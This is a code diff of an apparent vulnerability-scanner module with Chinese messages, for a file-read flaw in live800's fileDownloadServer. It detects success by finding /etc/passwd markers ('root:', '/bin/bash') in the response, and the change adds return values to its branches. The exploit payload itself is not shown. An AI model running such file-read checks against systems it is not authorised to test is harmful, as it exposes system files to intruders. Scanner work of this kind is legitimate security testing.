@@ -25,11 +25,14 @@ class live800_fileDownloadServer_fileread_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
                 cprint("[+]存在live800 fileDownloadServer文件读取漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "live800 fileDownloadServer文件读取漏洞", payload, req.text
             else:
                 cprint("[-]不存在live800_fileDownloadServer_fileread漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
